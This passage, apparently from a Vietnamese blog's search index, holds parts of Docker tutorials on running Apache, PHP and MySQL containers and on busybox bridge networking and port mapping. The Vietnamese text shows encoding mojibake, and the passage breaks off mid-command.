/home/edisc/Desktop/docker/data/httpd.conf:/usr/local/apache2/conf/httpd.conf httpd\r[Thu Jun 10 08:10:54.751670 2021] [proxy_html:notice] [pid 1:tid 139955972379776] AH01425: I18n support in mod_proxy_html requires mod_xml2enc. Without it, non-ASCII characters in proxied pages are likely to display incorrectly.\rAH00558: httpd: Could not reliably determine the server\u0026#39;s fully qualified domain name, using 172.23.0.2. Set the \u0026#39;ServerName\u0026#39; directive globally to suppress this message\r[Thu Jun 10 08:10:54.767249 2021] [proxy_html:notice] [pid 1:tid 139955972379776] AH01425: I18n support in mod_proxy_html requires mod_xml2enc. Without it, non-ASCII characters in proxied pages are likely to display incorrectly.\rAH00558: httpd: Could not reliably determine the server\u0026#39;s fully qualified domain name, using 172.23.0.2. Set the \u0026#39;ServerName\u0026#39; directive globally to suppress this message\r[Thu Jun 10 08:10:54.771929 2021] [mpm_event:notice] [pid 1:tid 139955972379776] AH00489: Apache/2.4.48 (Unix) configured -- resuming normal operations\r[Thu Jun 10 08:10:54.772004 2021] [core:notice] [pid 1:tid 139955972379776] AH00094: Command line: \u0026#39;httpd -D FOREGROUND\u0026#39;   Ki·ªÉm tra apache Nh∆∞ v·∫≠y ·ªü b∆∞·ªõc tr√™n m√°y ch·ªß apache c·ªßa ch√∫ng ta ƒë√£ ch·∫°y. ƒê·ªÉ ki·ªÉm tra, ta ti·∫øn h√†nh m·ªü tr√¨nh duy·ªát 127.0.0.1:9999 ho·∫∑c localhost:9999\nNh∆∞ v·∫≠y, m√°y ch·ªß apache ƒë√£ ho·∫°t ƒë·ªông hi·ªáu qu·∫£. Ch√∫ng ta g·ªçi file php ƒë·ªÉ xem proxy c√≥ ho·∫°t ƒë·ªông kh√¥ng\nNh∆∞ v·∫≠y, proxy ƒë√£ g·ªçi ƒë∆∞·ª£c test.php.\nC√†i ƒë·∫∑t, ch·∫°y MySQL b·∫±ng Docker Trong 2 ph·∫ßn tr∆∞·ªõc, ch√∫ng ta ƒë√£ t·∫°o ƒë∆∞·ª£c 2 container, m·ªôt container ch·∫°y php v√† m·ªôt container ch·∫°y server apache httpd. Ph·∫ßn n√†y ch√∫ng ta s·∫Ω ti·∫øn h√†nh c√†i ƒë·∫∑t v√† ch·∫°y MySQL b·∫±ng Docker.\nThi·∫øt l·∫≠p bi·∫øn m√¥i tr∆∞·ªùng cho container Docker cho ph√©p ch√∫ng ta thi·∫øt l·∫≠p c√°c bi·∫øn m√¥i tr∆∞·ªùng cho container th√¥ng qua t√πy ch·ªçn -e. V√≠ d·ª•, ta ch·∫°y m·ªôt container t·ª´ image busybox, trong ƒë√≥, thi·∫øt l·∫≠p c√°c bi·∫øn m√¥i tr∆∞·ªùng cho container:\n1 2 3 4 5 6  ‚ùØ docker run -it --rm -e BIEN1=VALUE1 -e BIEN2=\u0026#34;VALUE2\u0026#34; busybox\r/ # echo $BIEN1\rVALUE1\r/ # echo $BIEN2\rVALUE2\r/ #   ƒê√¢y l√† c√°ch th·ª©c nhi·ªÅu image ƒë√≥ng g√≥i v√† thi·∫øt l·∫≠p bi·∫øn m√¥i tr∆∞·ªùng gi√∫p ch√∫ng ta thi·∫øt l·∫≠p c√°c container khi ch·∫°y.\nT·∫£i v·ªÅ phi√™n b·∫£n mysql Ch√∫ng ta t·∫£i phi√™n b·∫£n m·ªõi nh√¢t c·ªßa mysql b·∫±ng l·ªánh docker pull\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  ‚ùØ docker pull mysql\rUsing default tag: latest\rlatest: Pulling from library/mysql\r69692152171a: Already exists 1651b0be3df3: Pull complete 951da7386bc8: Pull complete 0f86c95aa242: Pull complete 37ba2d8bd4fe: Pull complete 6d278bb05e94: Pull complete 497efbd93a3e: Pull complete f7fddf10c2c2: Pull complete 16415d159dfb: Pull complete 0e530ffc6b73: Pull complete b0a4a1a77178: Pull complete cd90f92aa9ef: Pull complete Digest: sha256:d50098d7fcb25b1fcb24e2d3247cae3fc55815d64fec640dc395840f8fa80969\rStatus: Downloaded newer image for mysql:latest\r‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rnewimage version2 a8e04dcf8737 2 days ago 170MB\rbusybox latest 69593048aa3a 2 days ago 1.24MB\rhttpd latest 39c2d1c93266 2 weeks ago 138MB\rphp 7.3-fpm 2692864592ed 4 weeks ago 399MB\rmysql latest c0cdc95609f1 4 weeks ago 556MB\rubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB\rcentos latest 300e315adb2f 6 months ago 209MB\r  M·ªôt s·ªë th√¥ng tin ch√≠nh c·∫ßn ch√∫ √Ω tr∆∞·ªõc khi b·∫Øt ƒë·∫ßu l√†m vi·ªác v·ªõi mysql:\n port: 3384 MYSQL 8.0 c√≥ th·ªÉ c√≥ m·ªôt s·ªë m√°y c≈© kh√¥ng h·ªó tr·ª£, c√≥ th·ªÉ c·∫ßn c·∫•u h√¨nh ƒë·ªÉ h·ªá th·ªëng c≈© c√≥ th·ªÉ login v√†o mysql n√†y. khi ƒë√≥ ta th√™m v√†o file config n·ªôi dung sau:  [mysqld]\rdefault-authentication-plugin=mysql_native_password\r file config: /etc/mysql/my.cnf c·ªßa container Bi·∫øn m√¥i tr∆∞·ªùng:  T√†i kho·∫£n root:MYSQL_ROOT_PASSWORD database: /var/lib/mysql    L·∫•y file c·∫•u h√¨nh my.cnf Ch√∫ng ta ch·∫°y file mysql v√† tr√≠ch xu·∫•t file my.cnf ra.\n1 2 3  ‚ùØ docker run --rm -v /home/edisc/Desktop/docker/data:/home/SharedData mysql cp /etc/mysql/my.cnf /home/SharedData/\r‚ùØ ls\rc1.txt data_container2.txt d.txt httpd.conf my.cnf www\r  C·∫•u h√¨nh file my.cnf  Ta th√™m d√≤ng l·ªánh  1  default-authentication-plugin=mysql_native_password\r  v√†o cu·ªëi file my.cnf\n T·∫°o th√™m th∆∞ m·ª•c db trong folder /home/edisc/Desktop/docker/data ƒë·ªÉ l∆∞u tr·ªØ d·ªØ li·ªáu, ƒë·ªìng th·ªùi khi x√≥a container ƒëi th√¨ csdl c·ªßa n√≥ c≈©ng kh√¥ng b·ªã m·∫•t ƒëi.  T·∫°o container mysql Ch√∫ng ta t·∫°o docker ƒë·ªÉ ch·∫°y mysql, trong ƒë√≥:\n Thi·∫øt l·∫≠p bi·∫øn m√¥i tr∆∞·ªùng ƒë·ªÉ l∆∞u m·∫≠t kh·∫©u cho t√†i kho·∫£n root, m·∫≠t kh·∫©u ta ch·ªçn l√† docker123:\n-e MYSQL_ROOT_PASSWORD=docker123, √Ånh x·∫° file c·∫•u h√¨nh my.cnf l√™n th·ª±c m·ª•c c·∫•u h√¨nh tr√™n container:\n-v /home/edisc/Desktop/docker/data/my.cnf:/etc/mysql/my.cnf, √Ånh x·∫° th∆∞ m·ª•c db tr√™n host l√™n th∆∞ m·ª•c l∆∞u tr·ªØ databse m·∫∑c ƒë·ªãnh c·ªßa container:\n-v /home/edisc/Desktop/docker/data/db:/var/lib/mysql T√™n l√† c-mysql: --name c-mysql  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  ‚ùØ docker run -e MYSQL_ROOT_PASSWORD=docker123 -v /home/edisc/Desktop/docker/data/my.cnf:/etc/mysql/my.cnf -v /home/edisc/Desktop/docker/data/db:/var/lib/mysql --name c-mysql mysql\r2021-06-10 09:02:24+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.25-1debian10 started.\r2021-06-10 09:02:25+00:00 [Note] [Entrypoint]: Switching to dedicated user \u0026#39;mysql\u0026#39;\r2021-06-10 09:02:25+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.25-1debian10 started.\r2021-06-10 09:02:25+00:00 [Note] [Entrypoint]: Initializing database files\r2021-06-10T09:02:25.233559Z 0 [System] [MY-013169] [Server] /usr/sbin/mysqld (mysqld 8.0.25) initializing of server in progress as process 43\r2021-06-10T09:02:25.244471Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.\r2021-06-10T09:02:26.680645Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.\r2021-06-10T09:02:29.942913Z 6 [Warning] [MY-010453] [Server] root@localhost is created with an empty password ! Please consider switching off the --initialize-insecure option.\r2021-06-10 09:02:38+00:00 [Note] [Entrypoint]: Database files initialized\r2021-06-10 09:02:38+00:00 [Note] [Entrypoint]: Starting temporary server\r2021-06-10T09:02:39.196368Z 0 [System] [MY-010116] [Server] /usr/sbin/mysqld (mysqld 8.0.25) starting as process 88\r2021-06-10T09:02:39.243106Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.\r2021-06-10T09:02:39.910377Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.\r2021-06-10T09:02:40.126089Z 0 [System] [MY-011323] [Server] X Plugin ready for connections. Socket: /var/run/mysqld/mysqlx.sock\r2021-06-10T09:02:40.376702Z 0 [Warning] [MY-010068] [Server] CA certificate ca.pem is self signed.\r2021-06-10T09:02:40.377098Z 0 [System] [MY-013602] [Server] Channel mysql_main configured to support TLS. Encrypted connections are now supported for this channel.\r...\r  Ch√∫ng ta kh√¥ng thi·∫øt l·∫≠p tham s·ªë √°nh x·∫° c·ªïng v√¨ ·ªü ƒë√¢y ch∆∞a c√≥ nhu c·∫ßu truy c·∫≠p t·ª´ b√™n ngo√†i v√†o csdl c-mysql m√† csdl n√†y ch·ªâ ƒë·ªÉ cho c-php v√† c-httpd truy c·∫≠p th√¥ng qua c·ªïng 3306. Trong th·ª±c t·∫ø, ch√∫ng ta mu·ªën truy c·∫≠p t·ª´ xa, ƒë·ªÉ c√°c server k·∫øt n·ªëi v·ªõi nhau, ta c·∫ßn √°nh x·∫° c·ªïng 3306 n√†y t·ªõi m√°y host.\nThi h√†nh m·ªôt s·ªë l·ªánh trong container c-mysql ƒê·∫øn ƒë√¢y, ch√∫ng ta ƒë√£ thi·∫øt l·∫≠p ƒë∆∞·ª£c m·ªôt container ch·∫°y mysql, ti·∫øp theo ch√∫ng ta v√†o container tr√™n ƒë·ªÉ ch·∫°y m·ªôt s·ªë c√¢u l·ªánh ƒë·ªÉ ki·ªÉm tra.\nV√†o container c-mysql ƒê·∫ßu ti√™n, v√†o container c-mysql b·∫±ng l·ªánh docker exec:\n1 2 3 4 5 6 7  ‚ùØ docker ps\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\r10c415b14dbe mysql \u0026#34;docker-entrypoint.s‚Ä¶\u0026#34; 5 minutes ago Up 5 minutes 3306/tcp, 33060/tcp c-mysql\r7e8910d1b55c php:7.3-fpm \u0026#34;docker-php-entrypoi‚Ä¶\u0026#34; 43 minutes ago Up 43 minutes 9000/tcp c-php\ra9d05fe2fc94 httpd \u0026#34;httpd-foreground\u0026#34; About an hour ago Up 34 minutes 0.0.0.0:443-\u0026gt;443/tcp, 0.0.0.0:9999-\u0026gt;80/tcp c-httpd\r‚ùØ docker exec -it c-mysql bash\rroot@10c415b14dbe:/#   K·∫øt n·ªëi v·ªõi mysql mysql c·ªßa ch√∫ng ta c√≥ username l√† root v√† c√≥ password l√† docker123 (thi·∫øt l·∫≠p ·ªü tr√™n). Tham s·ªë -pdocker123 gi√∫p ch√∫ng ta kh√¥ng c·∫ßn ph·∫£i nh·∫≠p l·∫°i password.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  root@10c415b14dbe:/# mysql -u root -pdocker123 mysql: [Warning] Using a password on the command line interface can be insecure.\rWelcome to the MySQL monitor. Commands end with ; or \\g.\rYour MySQL connection id is 8\rServer version: 8.0.25 MySQL Community Server - GPL\rCopyright (c) 2000, 2021, Oracle and/or its affiliates.\rOracle is a registered trademark of Oracle Corporation and/or its\raffiliates. Other names may be trademarks of their respective\rowners.\rType \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement.\rmysql\u0026gt;\r  Nh∆∞ v·∫≠y ch√∫ng ta ƒë√£ k·∫øt n·ªëi ƒë∆∞·ª£c mysql v√† v√†o b√™n trong c·ªßa sql-server.\nKi·ªÉm tra c√≥ nh·ªØng database n√†o trong mysql 1 2 3 4 5 6 7 8 9 10 11  mysql\u0026gt; show databases;\r+--------------------+\r| Database |\r+--------------------+\r| information_schema |\r| mysql |\r| performance_schema |\r| sys |\r+--------------------+\r4 rows in set (0.00 sec)\rmysql\u0026gt;\r  S·ª≠ d·ª•ng database mysql 1 2 3 4 5 6  mysql\u0026gt; use mysql;\rReading table information for completion of table and column names\rYou can turn off this feature to get a quicker startup with -A\rDatabase changed\rmysql\u0026gt;   Show table 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  mysql\u0026gt; show tables;\r+------------------------------------------------------+\r| Tables_in_mysql |\r+------------------------------------------------------+\r| columns_priv |\r| component |\r| db |\r| default_roles |\r| engine_cost |\r| func |\r| general_log |\r| global_grants |\r| gtid_executed |\r| help_category |\r| help_keyword |\r| help_relation |\r| help_topic |\r| innodb_index_stats |\r| innodb_table_stats |\r| password_history |\r| plugin |\r| procs_priv |\r| proxies_priv |\r| replication_asynchronous_connection_failover |\r| replication_asynchronous_connection_failover_managed |\r| role_edges |\r| server_cost |\r| servers |\r| slave_master_info |\r| slave_relay_log_info |\r| slave_worker_info |\r| slow_log |\r| tables_priv |\r| time_zone |\r| time_zone_leap_second |\r| time_zone_name |\r| time_zone_transition |\r| time_zone_transition_type |\r| user |\r+------------------------------------------------------+\r35 rows in set (0.00 sec)\rmysql\u0026gt;\r  T·∫°o d·ªØ li·ªáu 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  mysql\u0026gt; CREATE USER \u0026#39;testuser\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;testpass\u0026#39;;\rQuery OK, 0 rows affected (0.03 sec)\rmysql\u0026gt; create database db_test;\rQuery OK, 1 row affected (0.02 sec)\rmysql\u0026gt; show databases;\r+--------------------+\r| Database |\r+--------------------+\r| db_test |\r| information_schema |\r| mysql |\r| performance_schema |\r| sys |\r+--------------------+\r5 rows in set (0.00 sec)\rmysql\u0026gt; select User from user;\r+------------------+\r| User |\r+------------------+\r| root |\r| testuser |\r| mysql.infoschema |\r| mysql.session |\r| mysql.sys |\r| root |\r+------------------+\r6 rows in set (0.00 sec)\r  Nh∆∞ v·∫≠y ta c√≥ c√°c user l√†: root v√† testuser. V·ªõi testuser c√≥ password l√† testpass.\nK·∫øt lu·∫≠n Trong b√†i h·ªçc n√†y, ch√∫ng ta ƒë√£ h·ªçc ƒë∆∞·ª£c t·ª´ anh XuanThuLabChanel c√°ch c·∫•u h√¨nh ra 3 container ch·∫°y 3 d·ªãch v·ª• kh√°c nhau: mysql, php, m√°y ch·ªß web apache httpd. trong ƒë√≥ m√°y ch·ªß web truy c·∫≠p ƒë∆∞·ª£c c·ªïng 9999 tr√™n host. Trong b√†i ti·∫øp theo, ch√∫ng ta s·∫Ω c√†i ƒë·∫∑t wordpress v√†o h·ªá th·ªëng n√†y.\n","description":"Ph·∫ßn n√†y ch√∫ng ta s·∫Ω h·ªçc v·ªÅ : c√†i ƒë·∫∑t v√† c·∫•u h√¨nh m·ªôt h·ªá th·ªëng tr√™n docker g·ªìm  3 container ch·∫°y 3 d·ªãch v·ª• kh√°c nhau: mysql, php, m√°y ch·ªß web apache httpd. trong ƒë√≥ m√°y ch·ªß web truy c·∫≠p ƒë∆∞·ª£c c·ªïng 9999 tr√™n host","id":13,"section":"posts","tags":["Docker"],"title":"T√¨m hi·ªÉu v√† s·ª≠ d·ª•ng docker (P4)","uri":"https://minhlongmt183.github.io/posts/docker_p4/"},{"content":"To√†n b·ªô series n√†y ƒë∆∞·ª£c tham kh·∫£o t·ª´ hai ngu·ªìn ch√≠nh: XuanThuLabChanel v√† DockerDoc. Em xin ch√¢n th√†nh c·∫£m ∆°n s·ª± c·ªëng hi·∫øn c·ªßa c√°c t√°c gi·∫£ c·ªßa nh·ªØng k√™nh n√≥i tr√™n.‚ù§Ô∏è‚ù§Ô∏è‚ù§Ô∏è\r Gi·ªõi thi·ªáu v·ªÅ Image Busybox Busybox l√† m·ªôt image r·∫•t nh·ªè g·ªçn nh∆∞ng ch·ª©a r·∫•t nhi·ªÅu c√¥ng c·ª• d·ª±a tr√™n n·ªÅn t·∫£ng linux.\nT·∫£i image busybox:\n1 2 3 4 5 6  ‚ùØ docker pull busybox\rUsing default tag: latest\rlatest: Pulling from library/busybox\rb71f96345d44: Pull complete Digest: sha256:930490f97e5b921535c153e0e7110d251134cc4b72bbb8133c6a5065cc68580d\rStatus: Downloaded newer image for busybox:latest\r  T·∫°o m·ªôt container ch·∫°y image busybox\n1 2  ‚ùØ docker run -it --rm busybox\r/ #   Option --rm d√πng cho nh·ªØng container mu·ªën ch·∫°y m·ªôt l·∫ßn, sau khi ch·∫°y xong docker s·∫Ω t·ª± ƒë·ªông x√≥a container ƒë√≥ ƒëi.\nContainer c·ªßa image busybox c√≥ r·∫•t nhi·ªÅu l·ªánh, ƒë·ªÉ li·ªát k√™ c√°c l·ªánh, ta d√πng:\n1 2 3 4 5 6 7  / # ls /bin/ -la total 449700\rdrwxr-xr-x 2 root root 12288 Jun 7 17:34 .\rdrwxr-xr-x 1 root root 4096 Jun 9 16:00 ..\r-rwxr-xr-x 400 root root 1149184 Jun 7 17:34 [\r-rwxr-xr-x 400 root root 1149184 Jun 7 17:34 [[\r-rwxr-xr-x 400 root root 1149184 Jun 7 17:34 acpid\r  Gi·ªõi thi·ªáu m·∫°ng, network trong docker, m·∫°ng bridge Li·ªát k√™ c√°c m·∫°ng c√≥ trong docker. Ki·ªÉm tra trong docker c√≥ nh·ªØng m·∫°ng n√†o, ta d√πng l·ªánh:\n1 2 3 4 5  ‚ùØ docker network ls\rNETWORK ID NAME DRIVER SCOPE\re0b165102300 bridge bridge local\r0f2ab02aa9f4 host host local\r271997adaaa9 none null local\r  ·ªû ƒë√¢y ch√∫ng ta c√≥ 3 network ƒë∆∞·ª£c t·∫°o m·∫∑c ƒë·ªãnh khi docker t·∫°o, bao g·ªìm: bridge d√πng DRIVER bridge, host d√πng DRIVE host v√† none d√πng DRIVE null.\nKi·ªÉm tra th√¥ng tin network ƒê·ªÉ ki·ªÉm tra th√¥ng tin v·ªÅ m·ªôt network c≈©ng nh∆∞ nh·ªØng container n√†o k·∫øt n·ªëi v√†o, ta d√πng l·ªánh:\ndocker network inspect \u0026lt;NAME\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  ‚ùØ docker network inspect bridge\r[\r{\r\u0026#34;Name\u0026#34;: \u0026#34;bridge\u0026#34;,\r\u0026#34;Id\u0026#34;: \u0026#34;e0b1651023003b4e6235e7b45319daa20d80a247d66e0b303eaf5e53fb90f0f8\u0026#34;,\r\u0026#34;Created\u0026#34;: \u0026#34;2021-06-09T20:59:15.89942017+07:00\u0026#34;,\r\u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;,\r\u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;,\r\u0026#34;EnableIPv6\u0026#34;: false,\r\u0026#34;IPAM\u0026#34;: {\r\u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;,\r\u0026#34;Options\u0026#34;: null,\r\u0026#34;Config\u0026#34;: [\r{\r\u0026#34;Subnet\u0026#34;: \u0026#34;172.17.0.0/16\u0026#34;,\r\u0026#34;Gateway\u0026#34;: \u0026#34;172.17.0.1\u0026#34;\r}\r]\r},\r\u0026#34;Internal\u0026#34;: false,\r\u0026#34;Attachable\u0026#34;: false,\r\u0026#34;Ingress\u0026#34;: false,\r\u0026#34;ConfigFrom\u0026#34;: {\r\u0026#34;Network\u0026#34;: \u0026#34;\u0026#34;\r},\r\u0026#34;ConfigOnly\u0026#34;: false,\r\u0026#34;Containers\u0026#34;: {},\r\u0026#34;Options\u0026#34;: {\r\u0026#34;com.docker.network.bridge.default_bridge\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;com.docker.network.bridge.enable_icc\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;com.docker.network.bridge.enable_ip_masquerade\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;com.docker.network.bridge.host_binding_ipv4\u0026#34;: \u0026#34;0.0.0.0\u0026#34;,\r\u0026#34;com.docker.network.bridge.name\u0026#34;: \u0026#34;docker0\u0026#34;,\r\u0026#34;com.docker.network.driver.mtu\u0026#34;: \u0026#34;1500\u0026#34;\r},\r\u0026#34;Labels\u0026#34;: {}\r}\r]\r  ·ªû ƒë√¢y ch√∫ng ta ch√∫ √Ω, tr∆∞·ªùng Container r·ªóng, c√≥ nghƒ©a l√† kh√¥ng c√≥ container n√†o k·∫øt n·ªëi v√†o.\nM·∫°ng bridge. Ta ti·∫øn h√†nh t·∫°o m·ªôt container B1 v√† ki√™m tra l·∫°i m·∫°ng bridge.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51  ‚ùØ docker run -it --name B1 busybox\r/ # % ‚ùØ docker ps\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\r2f6dd1dda04d busybox \u0026#34;sh\u0026#34; 9 seconds ago Up 8 seconds B1\r‚ùØ docker network inspect bridge\r[\r{\r\u0026#34;Name\u0026#34;: \u0026#34;bridge\u0026#34;,\r\u0026#34;Id\u0026#34;: \u0026#34;e0b1651023003b4e6235e7b45319daa20d80a247d66e0b303eaf5e53fb90f0f8\u0026#34;,\r\u0026#34;Created\u0026#34;: \u0026#34;2021-06-09T20:59:15.89942017+07:00\u0026#34;,\r\u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;,\r\u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;,\r\u0026#34;EnableIPv6\u0026#34;: false,\r\u0026#34;IPAM\u0026#34;: {\r\u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;,\r\u0026#34;Options\u0026#34;: null,\r\u0026#34;Config\u0026#34;: [\r{\r\u0026#34;Subnet\u0026#34;: \u0026#34;172.17.0.0/16\u0026#34;,\r\u0026#34;Gateway\u0026#34;: \u0026#34;172.17.0.1\u0026#34;\r}\r]\r},\r\u0026#34;Internal\u0026#34;: false,\r\u0026#34;Attachable\u0026#34;: false,\r\u0026#34;Ingress\u0026#34;: false,\r\u0026#34;ConfigFrom\u0026#34;: {\r\u0026#34;Network\u0026#34;: \u0026#34;\u0026#34;\r},\r\u0026#34;ConfigOnly\u0026#34;: false,\r\u0026#34;Containers\u0026#34;: {\r\u0026#34;2f6dd1dda04d0ab42434a6cff6f9c7eb42474f81acdf32809486f8fa82be8951\u0026#34;: {\r\u0026#34;Name\u0026#34;: \u0026#34;B1\u0026#34;,\r\u0026#34;EndpointID\u0026#34;: \u0026#34;0af6a3739786e89d5161f25edf7bb2a5d900ab580ab53e8f852a197134e010b7\u0026#34;,\r\u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:11:00:02\u0026#34;,\r\u0026#34;IPv4Address\u0026#34;: \u0026#34;172.17.0.2/16\u0026#34;,\r\u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34;\r}\r},\r\u0026#34;Options\u0026#34;: {\r\u0026#34;com.docker.network.bridge.default_bridge\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;com.docker.network.bridge.enable_icc\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;com.docker.network.bridge.enable_ip_masquerade\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;com.docker.network.bridge.host_binding_ipv4\u0026#34;: \u0026#34;0.0.0.0\u0026#34;,\r\u0026#34;com.docker.network.bridge.name\u0026#34;: \u0026#34;docker0\u0026#34;,\r\u0026#34;com.docker.network.driver.mtu\u0026#34;: \u0026#34;1500\u0026#34;\r},\r\u0026#34;Labels\u0026#34;: {}\r}\r]\r  Xem l·∫°i tr∆∞·ªùng container th√¨ ƒë√£ th·∫•y c√≥ th√™m m·ªôt container c√≥ t√™n l√† B1 ƒëang ch·∫°y. Ngo√†i ra ch√∫ng ta c√≤n c√≥ th·ªÉ ki·∫øm tra container ƒëang d√πng m·∫°ng n√†o v√† ƒë∆∞·ª£c c·∫•p ƒë·ªãa ch·ªâ IP b·∫±ng bao nhi√™u th√¥ng qua l·ªánh docker inspect \u0026lt;container_name\u0026gt;\nT·∫°o ra th√™m 1 container t√™n B2, khi ƒë√≥ container B1, B2 c√≥ th·ªÉ nh√¨n th·∫•y nhau, ch√∫ng ta c√≥ th·ªÉ ki·ªÉm tra th√¥ng qua l·ªánh ping.\nTrong image busybox, c√≥ s·∫µn m·ªôt c√¥ng c·ª• ƒë·ªÉ t·∫°o m√°y ch·ªß web http. Gi·∫£ s·ª≠ ta mu·ªën cho container B2 ch·∫°y m√°y ch·ªß web http, ch√∫ng ta v√†o /var/www v√† ch·∫°y l·ªánh httpd\n1 2 3 4 5 6 7  ‚ùØ docker attach B2\r/ # cd var/\r/var # ls\rspool www\r/var # cd www/\r/var/www # httpd\r/var/www #   T·∫°o m·ªôt file index.html v·ªõi n·ªôi dung l√†:\n1  web server is running...\r  T·ª´ container B1, ta ti·∫øn h√†nh wget t·ªõi B2\n1 2 3 4 5 6 7 8  ‚ùØ docker attach B1\r/ # wget -O - 172.17.0.3\rConnecting to 172.17.0.3 (172.17.0.3:80)\rwriting to stdout\rweb server is running...\r- 100% |********************************| 25 0:00:00 ETA\rwritten to stdout\r/ #   V·ªõi 172.17.0.3 l√† ƒë·ªãa ch·ªâ c·ªßa container B2, c√≥ th·ªÉ xem b·∫±ng l·ªánh docker network inspect bridge. R√µ r√†ng, container B1 ƒë√£ ƒë·ªçc ƒë∆∞·ª£c file index m√† B2 tr·∫£ v·ªÅ v·ªõi d√≤ng ch·ªØ web server is running...\n√Ånh x·∫° c·ªïng m·∫°ng trong docker √Ånh x·∫° c·ªïng m·∫°ng B2 ƒëang m·ªü c·ªïng 80, m√°y host c·ªßa ch√∫ng ta ƒëang c√≥ ƒë·ªãa ch·ªâ l√† 127.0.0.1, ch√∫ng ta mu·ªën t·ª´ ngo√†i m·∫°ng truy c·∫≠p ƒë∆∞·ª£c t·ªõi container B2 th√¨ ph·∫£i √°nh x·∫° c·ªïng 80 c·ªßa B2 t·ªõi m·ªôt c·ªïng n√†o ƒë√≥ c·ªßa host. Trong v√≠ d·ª• n√†y, ch√∫ng ta s·∫Ω thi·∫øt l·∫≠p truy c·∫≠p ƒë·∫øn c·ªïng 80 c·ªßa B2 th√¥ng qua c·ªïng 8888 ip m√°y host 127.0.0.1.\nƒêi·ªÅu n√†y ƒë∆∞·ª£c l√†m ·ªü b∆∞·ªõc t·∫°o container B2, l√∫c t·∫°o ch√∫ng ta s·∫Ω √°nh x·∫° c·ªïng 80 t·ªõi c·ªïng 8888 c·ªßa m√°y host. C√∫ ph√°p nh∆∞ sau:\ndocker run -it --name \u0026lt;name\u0026gt; -p \u0026lt;host_port\u0026gt;:\u0026lt;container_port\u0026gt; image\n1 2  ‚ùØ docker run -it --name B2 -p 8888:80 busybox\r/ #   Khi ki·ªÉm tra b·∫±ng l·ªánh docker ps ta s·∫Ω th·∫•y container B2 ƒë√£ √°nh x·∫° c·ªïng 80 l·ªánh 8888 c·ªßa m√°y host ·ªü PORT.\n1 2 3  ‚ùØ docker ps\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\rbdd19faad9cf busybox \u0026#34;sh\u0026#34; 8 minutes ago Up 8 minutes 0.0.0.0:8888-\u0026gt;80/tcp B2\r  Ch√∫ng ta s·∫Ω thao t√°c l·∫°i m·ªôt l·∫ßn ·ªü docker B2 ƒë·ªÉ ch·∫°y httpd v√† t·∫°o file index.html v·ªõi n·ªôi dung web server is running... trong th∆∞ m·ª•c /var/www. Sau ƒë√≥, ch√∫ng ta truy c·∫≠p ·ªü tr√¨nh duy·ªán chrome t·ª´ m√°y host ƒë·∫øn ƒë·ªãa ch·ªâ 127.0.0.1:8888\nNh∆∞ v·∫≠y, ta ƒë√£ c√≥ th·ªÉ truy c·∫≠p ƒë·∫øn file index.html trong container B2 t·ª´ m·∫°ng b√™n ngo√†i host.\nT·∫°o th√™m m·∫°ng Tr∆∞·ªùng h·ª£p ch√∫ng ta kh√¥ng mu·ªën t·∫•t c·∫£ c√°c container c√πng k·∫øt n·ªëi v√†o m·ªôt m·∫°ng bridge, ta c√≥ th·ªÉ t·∫°o th√™m nhi·ªÅu bridge ri√™ng ƒë·ªÉ c√≥ th·ªÉ t√°ch c√°c ri√™ng c√°c container th√†nh c√°c c·ª•m ri√™ng. ƒê·ªÉ t·∫°o ra m·ªôt m·∫°ng bridge, ta d√πng l·ªánh:\ndocker network create --driver \u0026lt;loai_mang\u0026gt; \u0026lt;ten_mang\u0026gt;\n·ªû ƒë√¢y ch√∫ng ta mu·ªën t·∫°o th√™m m·∫°ng bridge n√™n sau --driver s·∫Ω l√† bridge\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  ‚ùØ docker network ls\rNETWORK ID NAME DRIVER SCOPE\r286d5161c9f6 bridge bridge local\r0f2ab02aa9f4 host host local\r271997adaaa9 none null local\r‚ùØ docker network create --driver bridge mynetwork\r6c224f5d1a9819ba01d68ed6cd3a15357709d3b8dcf0b1ab0e289d11973f43d0\r‚ùØ docker network create 